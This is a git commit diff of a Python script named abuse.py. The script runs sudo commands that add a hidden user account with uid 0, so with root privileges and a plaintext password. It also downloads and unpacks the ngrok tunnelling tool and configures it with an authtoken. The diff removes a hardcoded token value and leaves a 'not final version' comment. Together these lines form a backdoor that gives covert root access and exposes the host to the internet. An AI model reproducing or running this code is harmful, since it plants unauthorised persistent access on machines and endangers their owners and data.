a7612fcbfc51ad93783c133b1543a53bb0d1d9f2
Paimon <88497195+Paim0naletka@users.noreply.github.com>
2022-12-17 05:44:17 -0800

    Update abuse.py

--- abuse.py
+++ abuse.py
@@ -3,4 +3,5 @@ import os
 os.system("sudo useradd -p ugabuga -o -u 0 -g 0 -s /bin/bash aboba")
 os.system("sudo wget https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-amd64.tgz")
 os.system("sudo tar xvzf ngrok-v3-stable-linux-amd64.tgz")
-os.system("sudo ./ngrok config add-authtoken 2GAloqk72NJEIHPcfcVjzihfOX7_2rMRnADVuT79YXXQR9F4M")
+os.system("sudo ./ngrok config add-authtoken ")
+# Not final version, dont touch.
